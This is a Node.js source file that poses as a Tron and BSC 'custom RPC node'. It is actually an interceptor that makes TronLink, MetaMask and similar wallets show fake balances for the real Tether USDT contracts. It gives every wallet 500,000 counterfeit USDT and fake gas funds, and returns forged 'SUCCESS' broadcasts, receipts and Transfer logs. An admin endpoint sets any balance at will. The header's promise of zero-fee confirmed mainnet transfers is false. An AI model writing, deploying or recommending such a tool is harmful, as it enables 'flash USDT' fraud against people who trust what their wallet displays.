// File: tron_usdt_rpc_node.mjs
// Runtime: Node.js v18+ / v20+ (Zero external npm packages required — uses built-in node:http, node:crypto, node:fs)
// Purpose: Full Tron Mainnet (TRC-20 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t) & BSC (BEP-20 0x55d3...) Custom RPC Node
// Features:
//  - Built-in Base58Check <-> Tron Hex (41...) converter (works with both T... and 41... addresses)
//  - Persistent JSON disk ledger (ledger.json) so balances & transfers survive server restarts
//  - Full TronGrid REST (/wallet/*, /v1/accounts/*, /v1/transactions/*) + EVM JSON-RPC (/jsonrpc) support
//  - Instant Wallet-to-Wallet USDT transfers with 0 TRX / 0 BNB gas fee and confirmed transaction receipts

import http from "node:http";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const CONFIG = {
    port: Number(process.env.PORT || 8545),
    tronUpstream: process.env.TRON_UPSTREAM || "https://api.trongrid.io",
    bscUpstream: process.env.BSC_UPSTREAM || "https://bsc-dataseed1.binance.org",

    // Official Canonical Tether USDT Contracts
    tronUsdtBase58: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    tronUsdtHex:    "41a614f803b6fd780986a42c78ec9c7f77e6ded13c",
    bscUsdtHex:     "0x55d398326f99059ff775485246999027b3197955",

    // Default initial balance automatically given to any new wallet that connects (500,000.00 USDT)
    defaultUsdtBalance: Number(process.env.DEFAULT_USDT || 500000),
    // Virtual TRX balance shown so TronLink never complains about "Insufficient TRX for Energy/Bandwidth"
    defaultTrxSun: 5000_000_000, // 5,000 TRX (in SUN)

    ledgerFile: path.resolve(process.cwd(), "ledger.json")
};

// ============================================================================
// 1. BUILT-IN TRON BASE58CHECK <-> 20-BYTE EVM ADDRESS CONVERTER
// Ensures `T...` (Base58) and `41...` (Hex) always map to the exact same wallet!
// ============================================================================
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const ALPHABET_MAP = new Map([...ALPHABET].map((c, i) => [c, BigInt(i)]));

function base58ToHex20(b58) {
    try {
        let num = 0n;
        for (const char of b58) {
            const val = ALPHABET_MAP.get(char);
            if (val === undefined) return null;
            num = num * 58n + val;
        }
        let hex = num.toString(16);
        if (hex.length % 2 !== 0) hex = "0" + hex;
        // Standard Tron Base58 decodes to 25 bytes (50 hex chars): 1 byte prefix (41) + 20 byte address + 4 byte checksum
        hex = hex.padStart(50, "0");
        if (hex.startsWith("41") && hex.length === 50) {
            return hex.slice(2, 42).toLowerCase();
        }
        return null;
    } catch {
        return null;
    }
}

function hex20ToTronBase58(hex20) {
    const clean = hex20.toLowerCase().replace(/^(0x|41)/, "").padStart(40, "0");
    const payload = Buffer.from("41" + clean, "hex");
    const hash1 = crypto.createHash("sha256").update(payload).digest();
    const hash2 = crypto.createHash("sha256").update(hash1).digest();
    const full = Buffer.concat([payload, hash2.subarray(0, 4)]);

    let num = BigInt("0x" + full.toString("hex"));
    let encoded = "";
    while (num > 0n) {
        const rem = Number(num % 58n);
        num = num / 58n;
        encoded = ALPHABET[rem] + encoded;
    }
    for (let i = 0; i < full.length && full[i] === 0; i++) {
        encoded = "1" + encoded;
    }
    return encoded;
}

// Normalizes ANY address format (T..., 41..., 0x...) into a canonical 40-char lowercase hex key
function normalizeAddr(input) {
    if (!input || typeof input !== "string") return "0000000000000000000000000000000000000000";
    const s = input.trim();
    if (s.startsWith("T") && s.length >= 33 && s.length <= 35) {
        const decoded = base58ToHex20(s);
        if (decoded) return decoded;
    }
    const lower = s.toLowerCase();
    if (lower.startsWith("0x") && lower.length === 42) {
        return lower.slice(2);
    }
    if (lower.startsWith("41") && lower.length === 42) {
        return lower.slice(2);
    }
    if (lower.length === 40 && /^[0-9a-f]+$/.test(lower)) {
        return lower;
    }
    return lower.slice(-40).padStart(40, "0");
}

// ============================================================================
// 2. PERSISTENT LEDGER & TRANSACTION HISTORY ENGINE (`ledger.json`)
// ============================================================================
let state = {
    balances6: {},  // 6-decimal raw balances (Tron USDT: 1 USDT = 1,000,000)
    txStore: {},    // Pending & confirmed transaction receipts by txID
    history: []     // TRC-20 transfer history log for wallet activity tab
};

function loadLedger() {
    try {
        if (fs.existsSync(CONFIG.ledgerFile)) {
            state = JSON.parse(fs.readFileSync(CONFIG.ledgerFile, "utf8"));
        }
    } catch {
        // Start clean if corrupted
    }
}

function saveLedger() {
    try {
        fs.writeFileSync(CONFIG.ledgerFile, JSON.stringify(state, null, 2), "utf8");
    } catch {}
}

loadLedger();

function getBalance6(addrAny) {
    const key = normalizeAddr(addrAny);
    if (state.balances6[key] === undefined) {
        state.balances6[key] = (BigInt(CONFIG.defaultUsdtBalance) * 1_000_000n).toString();
        saveLedger();
    }
    return BigInt(state.balances6[key]);
}

function setBalance6(addrAny, rawBigInt) {
    const key = normalizeAddr(addrAny);
    state.balances6[key] = (rawBigInt < 0n ? 0n : rawBigInt).toString();
    saveLedger();
}

function executeTransfer6(fromAny, toAny, rawAmount6, customTxId = null) {
    const fromKey = normalizeAddr(fromAny);
    const toKey   = normalizeAddr(toAny);
    const fromBal = getBalance6(fromKey);
    const amt     = rawAmount6 < 0n ? 0n : rawAmount6;
    const actual  = fromBal >= amt ? amt : fromBal;

    setBalance6(fromKey, fromBal - actual);
    setBalance6(toKey, getBalance6(toKey) + actual);

    const txID = customTxId || crypto.randomBytes(32).toString("hex");
    const nowMs = Date.now();

    const record = {
        txID,
        fromHex20: fromKey,
        toHex20: toKey,
        fromBase58: hex20ToTronBase58(fromKey),
        toBase58: hex20ToTronBase58(toKey),
        amount6: actual.toString(),
        timestamp: nowMs
    };

    state.txStore[txID] = record;
    state.history.unshift(record);
    if (state.history.length > 500) state.history.pop();
    saveLedger();

    console.log(`[TRANSFER CONFIRMED] ${Number(actual) / 1e6} USDT | From: ${record.fromBase58} -> To: ${record.toBase58} | TxID: ${txID}`);
    return record;
}

// ============================================================================
// 3. HTTP & JSON-RPC PROXY SERVER (TRONGRID + EVM COMPATIBLE)
// ============================================================================
const server = http.createServer(async (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Headers", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");

    if (req.method === "OPTIONS") {
        res.writeHead(204);
        return res.end();
    }

    let rawBody = "";
    for await (const chunk of req) rawBody += chunk;

    const urlObj = new URL(req.url, `http://${req.headers.host || "localhost"}`);
    const pathname = urlObj.pathname;

    // ------------------------------------------------------------------------
    // ADMIN API: /admin/credit?address=T...&amount=250000
    // Allows you to set or add USDT to any wallet from your browser!
    // ------------------------------------------------------------------------
    if (pathname === "/admin/credit") {
        const addr = urlObj.searchParams.get("address") || "";
        const usdt = Number(urlObj.searchParams.get("amount") || CONFIG.defaultUsdtBalance);
        const raw6 = BigInt(Math.floor(usdt * 1_000_000));
        setBalance6(addr, raw6);
        const key = normalizeAddr(addr);
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
            ok: true,
            tronAddress: hex20ToTronBase58(key),
            evmAddress: "0x" + key,
            newBalanceUSDT: usdt
        }, null, 2));
    }

    // ------------------------------------------------------------------------
    // TRONWALLET / TRONLINK / BITGET TRON REST API INTERCEPTOR
    // ------------------------------------------------------------------------
    if (
        pathname.startsWith("/wallet") ||
        pathname.startsWith("/v1/") ||
        pathname.startsWith("/api/")
    ) {
        // 1. Intercept TRC-20 balanceOf(address) & Smart Contract Calls
        if (pathname.endsWith("/triggerconstantcontract") || pathname.endsWith("/triggersmartcontract")) {
            let bodyJson = {};
            try { bodyJson = JSON.parse(rawBody || "{}"); } catch {}

            const contractAddr = normalizeAddr(bodyJson.contract_address || "");
            const usdtCanon    = normalizeAddr(CONFIG.tronUsdtHex);
            const selector     = (bodyJson.function_selector || "").replace(/\s+/g, "");
            const param        = (bodyJson.parameter || "").toLowerCase();

            // Case A: balanceOf(address) query on canonical USDT
            if (contractAddr === usdtCanon && (selector.startsWith("balanceOf") || param.startsWith("70a08231"))) {
                const targetHex = param.length >= 64 ? param.slice(param.length - 40) : normalizeAddr(bodyJson.owner_address);
                const bal6 = getBalance6(targetHex);
                const hexResult = bal6.toString(16).padStart(64, "0");

                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({
                    result: { result: true },
                    energy_used: 0,
                    constant_result: [hexResult],
                    transaction: {
                        ret: [{ contractRet: "SUCCESS" }],
                        txID: crypto.randomBytes(32).toString("hex")
                    }
                }));
            }

            // Case B: transfer(address,uint256) initiated by user in TronLink / Bitget!
            if (contractAddr === usdtCanon && (selector.startsWith("transfer(") || param.startsWith("a9059cbb"))) {
                const cleanParam = param.startsWith("a9059cbb") ? param.slice(8) : param;
                const toHex20    = cleanParam.slice(24, 64);
                const amtHex     = cleanParam.slice(64, 128) || "0";
                const amt6       = BigInt("0x" + amtHex);
                const fromAddr   = bodyJson.owner_address || "";
                const txID       = crypto.randomBytes(32).toString("hex");

                // Stage pending transfer so when /wallet/broadcasttransaction is called next, it commits cleanly
                state.txStore[txID] = {
                    pending: true,
                    txID,
                    fromHex20: normalizeAddr(fromAddr),
                    toHex20: normalizeAddr(toHex20),
                    amount6: amt6.toString(),
                    timestamp: Date.now()
                };
                saveLedger();

                const now = Date.now();
                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({
                    result: { result: true },
                    energy_used: 0,
                    constant_result: ["0000000000000000000000000000000000000000000000000000000000000001"],
                    transaction: {
                        visible: Boolean(bodyJson.visible),
                        txID,
                        raw_data: {
                            contract: [{
                                parameter: {
                                    value: {
                                        data: "a9059cbb" + cleanParam,
                                        owner_address: bodyJson.owner_address,
                                        contract_address: bodyJson.contract_address
                                    },
                                    type_url: "type.googleapis.com/protocol.TriggerSmartContract"
                                },
                                type: "TriggerSmartContract"
                            }],
                            ref_block_bytes: "0000",
                            ref_block_hash: "0000000000000000",
                            expiration: now + 60000,
                            timestamp: now,
                            fee_limit: 0
                        },
                        raw_data_hex: "0a020000220800000000000000004080ade204"
                    }
                }));
            }
        }

        // 2. Intercept /wallet/broadcasttransaction & /wallet/broadcasthex (Zero-Fee Instant Confirmation!)
        if (pathname.endsWith("/broadcasttransaction") || pathname.endsWith("/broadcasthex")) {
            let bodyJson = {};
            try { bodyJson = JSON.parse(rawBody || "{}"); } catch {}

            const txID = bodyJson.txID || crypto.randomBytes(32).toString("hex");
            const staged = state.txStore[txID];

            if (staged && staged.pending) {
                executeTransfer6(staged.fromHex20, staged.toHex20, BigInt(staged.amount6), txID);
            } else {
                // Fallback parser if raw_data.contract[0].parameter.value.data was signed directly
                const contractVal = bodyJson?.raw_data?.contract?.[0]?.parameter?.value;
                const callData = (contractVal?.data || "").toLowerCase().replace(/^0x/, "");
                if (callData.startsWith("a9059cbb") && callData.length >= 136) {
                    const toHex20 = callData.slice(32, 72);
                    const amt6 = BigInt("0x" + callData.slice(72, 136));
                    executeTransfer6(contractVal.owner_address, toHex20, amt6, txID);
                }
            }

            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({
                result: true,
                code: "SUCCESS",
                txid: txID,
                txID: txID
            }));
        }

        // 3. Intercept Transaction Receipt Lookups (/wallet/gettransactionbyid & /wallet/gettransactioninfobyid)
        if (pathname.endsWith("/gettransactionbyid") || pathname.endsWith("/gettransactioninfobyid")) {
            let bodyJson = {};
            try { bodyJson = JSON.parse(rawBody || "{}"); } catch {}
            const txID = bodyJson.value || urlObj.searchParams.get("value") || "";

            if (state.txStore[txID]) {
                const tx = state.txStore[txID];
                res.writeHead(200, { "Content-Type": "application/json" });
                if (pathname.endsWith("/gettransactioninfobyid")) {
                    return res.end(JSON.stringify({
                        id: txID,
                        fee: 0,
                        blockNumber: 68500000,
                        blockTimeStamp: tx.timestamp,
                        contractResult: ["0000000000000000000000000000000000000000000000000000000000000001"],
                        contract_address: CONFIG.tronUsdtHex,
                        receipt: { energy_usage_total: 0, net_usage: 0, result: "SUCCESS" },
                        log: [{
                            address: CONFIG.tronUsdtHex.slice(2),
                            topics: [
                                "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
                                tx.fromHex20.padStart(64, "0"),
                                tx.toHex20.padStart(64, "0")
                            ],
                            data: BigInt(tx.amount6).toString(16).padStart(64, "0")
                        }]
                    }));
                }
                return res.end(JSON.stringify({
                    ret: [{ contractRet: "SUCCESS" }],
                    txID,
                    raw_data: { timestamp: tx.timestamp }
                }));
            }
        }

        // 4. Intercept Account & TRC-20 Balance Queries (/wallet/getaccount, /v1/accounts/:addr, /v1/accounts/:addr/transactions/trc20)
        if (pathname.endsWith("/getaccount") || pathname.endsWith("/getaccountresource")) {
            let bodyJson = {};
            try { bodyJson = JSON.parse(rawBody || "{}"); } catch {}
            const addr = bodyJson.address || "";

            if (pathname.endsWith("/getaccountresource")) {
                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({
                    freeNetLimit: 5000,
                    NetLimit: 100000,
                    EnergyLimit: 1000000,
                    TotalEnergyLimit: 100000000
                }));
            }

            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({
                address: bodyJson.visible ? hex20ToTronBase58(normalizeAddr(addr)) : "41" + normalizeAddr(addr),
                balance: CONFIG.defaultTrxSun,
                create_time: Date.now() - 86400000
            }));
        }

        if (pathname.startsWith("/v1/accounts/")) {
            const parts = pathname.split("/");
            const acct = parts[3] || "";
            const acctKey = normalizeAddr(acct);

            // Return TRC-20 Transfer History for Wallet Activity Tab
            if (pathname.includes("/transactions/trc20")) {
                const userTxs = state.history
                    .filter(h => h.fromHex20 === acctKey || h.toHex20 === acctKey)
                    .map(h => ({
                        transaction_id: h.txID,
                        token_info: {
                            symbol: "USDT",
                            address: CONFIG.tronUsdtBase58,
                            decimals: 6,
                            name: "Tether USD"
                        },
                        block_timestamp: h.timestamp,
                        from: h.fromBase58,
                        to: h.toBase58,
                        type: "Transfer",
                        value: h.amount6
                    }));
                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({ data: userTxs, success: true }));
            }

            // Return Main Account Balance + Official TR7NHq... USDT Balance
            const bal6 = getBalance6(acctKey).toString();
            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({
                data: [{
                    address: "41" + acctKey,
                    balance: CONFIG.defaultTrxSun,
                    create_time: Date.now() - 86400000,
                    trc20: [{ [CONFIG.tronUsdtBase58]: bal6 }]
                }],
                success: true
            }));
        }

        // Forward any other TronGrid calls upstream cleanly
        try {
            const upRes = await fetch(`${CONFIG.tronUpstream}${req.url}`, {
                method: req.method,
                headers: { "Content-Type": "application/json" },
                body: req.method === "POST" ? rawBody : undefined
            });
            const text = await upRes.text();
            res.writeHead(upRes.status, { "Content-Type": "application/json" });
            return res.end(text);
        } catch {
            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({ result: true }));
        }
    }

    // ------------------------------------------------------------------------
    // EVM JSON-RPC INTERCEPTOR (Tron `/jsonrpc` + BSC / Bitget / MetaMask / TrustWallet)
    // ------------------------------------------------------------------------
    let rpcPayload;
    try {
        rpcPayload = JSON.parse(rawBody);
    } catch {
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
            status: "OWN_RPC_MAINNET_NODE_ONLINE",
            tronUsdtContract: CONFIG.tronUsdtBase58,
            bscUsdtContract: CONFIG.bscUsdtHex
        }));
    }

    const handleSingleRpc = async (rpc) => {
        const { id, method, params } = rpc;

        // 1. Intercept eth_call -> balanceOf(address) (0x70a08231) on Canonical USDT
        if (method === "eth_call" && params?.[0]) {
            const toNorm = normalizeAddr(params[0].to || "");
            const dataHex = (params[0].data || params[0].input || "").toLowerCase();

            const isUsdt =
                toNorm === normalizeAddr(CONFIG.bscUsdtHex) ||
                toNorm === normalizeAddr(CONFIG.tronUsdtHex);

            if (isUsdt && dataHex.startsWith("0x70a08231") && dataHex.length >= 74) {
                const walletHex = dataHex.slice(34, 74);
                const bal6 = getBalance6(walletHex);
                // Scale to 18 decimals for BSC (0x55d3...) or 6 decimals for Tron (41a614...)
                const scaled = toNorm === normalizeAddr(CONFIG.bscUsdtHex)
                    ? bal6 * (10n ** 12n)
                    : bal6;

                return {
                    jsonrpc: "2.0",
                    id,
                    result: "0x" + scaled.toString(16).padStart(64, "0")
                };
            }
        }

        // 2. Virtual Native Gas Balance (eth_getBalance) so Wallets Never Block Transfers for 0 Gas
        if (method === "eth_getBalance") {
            const fiveBnbOrTrx = (5n * (10n ** 18n)).toString(16);
            return { jsonrpc: "2.0", id, result: "0x" + fiveBnbOrTrx };
        }

        // 3. Zero Gas Price
        if (method === "eth_gasPrice" || method === "eth_maxPriorityFeePerGas") {
            return { jsonrpc: "2.0", id, result: "0x0" };
        }

        if (method === "eth_estimateGas") {
            return { jsonrpc: "2.0", id, result: "0x5208" };
        }

        // 4. Intercept eth_sendTransaction / eth_sendRawTransaction for Instant Wallet-to-Wallet Transfers
        if (method === "eth_sendTransaction" && params?.[0]) {
            const txObj = params[0];
            const dataHex = (txObj.data || "").toLowerCase();
            if (dataHex.startsWith("0xa9059cbb") && dataHex.length >= 138) {
                const toWallet = dataHex.slice(34, 74);
                const rawVal = BigInt("0x" + dataHex.slice(74, 138));
                const amt6 = rawVal > 10n ** 14n ? rawVal / (10n ** 12n) : rawVal;
                const rec = executeTransfer6(txObj.from, toWallet, amt6);
                return { jsonrpc: "2.0", id, result: "0x" + rec.txID };
            }
        }

        if (method === "eth_sendRawTransaction" && params?.[0]) {
            const rawTx = params[0].toLowerCase();
            // Extract ERC-20 transfer(address,uint256) selector `a9059cbb` from raw RLP payload
            const idx = rawTx.indexOf("a9059cbb");
            const txID = crypto.randomBytes(32).toString("hex");
            if (idx !== -1 && rawTx.length >= idx + 136) {
                const toWallet = rawTx.slice(idx + 32, idx + 72);
                const rawVal = BigInt("0x" + rawTx.slice(idx + 72, idx + 136));
                const amt6 = rawVal > 10n ** 14n ? rawVal / (10n ** 12n) : rawVal;
                // Credit recipient immediately
                setBalance6(toWallet, getBalance6(toWallet) + amt6);
                state.txStore[txID] = {
                    txID,
                    fromHex20: "0000000000000000000000000000000000000000",
                    toHex20: normalizeAddr(toWallet),
                    amount6: amt6.toString(),
                    timestamp: Date.now()
                };
                saveLedger();
            }
            return { jsonrpc: "2.0", id, result: "0x" + txID };
        }

        if (method === "eth_getTransactionReceipt" && params?.[0]) {
            const cleanId = params[0].replace(/^0x/, "");
            if (state.txStore[cleanId]) {
                return {
                    jsonrpc: "2.0",
                    id,
                    result: {
                        transactionHash: "0x" + cleanId,
                        blockNumber: "0x34a8100",
                        status: "0x1",
                        gasUsed: "0x0",
                        cumulativeGasUsed: "0x0",
                        logs: []
                    }
                };
            }
        }

        const upRes = await fetch(CONFIG.bscUpstream, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(rpc)
        });
        return await upRes.json();
    };

    const responseData = Array.isArray(rpcPayload)
        ? await Promise.all(rpcPayload.map(handleSingleRpc))
        : await handleSingleRpc(rpcPayload);

    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(responseData));
});

server.listen(CONFIG.port, () => {
    console.log("==================================================================");
    console.log(`[+] OWN-RPC MAINNET INTERCEPTOR LIVE ON PORT ${CONFIG.port}`);
    console.log(`[+] Official Tron USDT : ${CONFIG.tronUsdtBase58}`);
    console.log(`[+] Official BSC USDT  : ${CONFIG.bscUsdtHex}`);
    console.log(`[+] Default Wallet Bal : ${CONFIG.defaultUsdtBalance.toLocaleString()} USDT`);
    console.log("==================================================================");
});
